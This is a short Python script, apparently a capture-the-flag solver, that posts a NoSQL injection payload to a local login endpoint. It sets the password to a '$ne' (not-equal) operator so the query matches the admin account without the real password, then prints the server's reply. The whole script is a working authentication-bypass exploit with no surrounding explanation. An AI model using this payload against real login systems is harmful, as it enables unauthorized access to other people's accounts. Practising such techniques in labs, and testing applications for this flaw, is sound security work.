import requests
import string

flag=""

url="http://localhost:1330/login"
headers={'content-type': 'application/json'}

payload='{"username": "admin", "password": {"$ne": "null" }}'
r = requests.post(url, data = payload, headers = headers)
print(r.text)